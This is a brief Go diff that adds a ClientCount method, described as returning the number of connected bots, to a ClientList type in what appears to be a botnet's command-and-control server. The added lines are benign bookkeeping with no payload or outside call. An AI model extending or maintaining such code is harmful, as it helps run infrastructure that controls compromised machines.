@@ -57,6 +57,11 @@ func (this *ClientList) Distribution() map[string]int {
 	return <-this.distViewRes
 }
 
+/* ClientCount returns the current number of connected bots */
+func (this *ClientList) ClientCount() int {
+	return this.Count()
+}
+
 func (this *ClientList) AddClient(c *Bot) {
 	this.addQueue <- c
 }
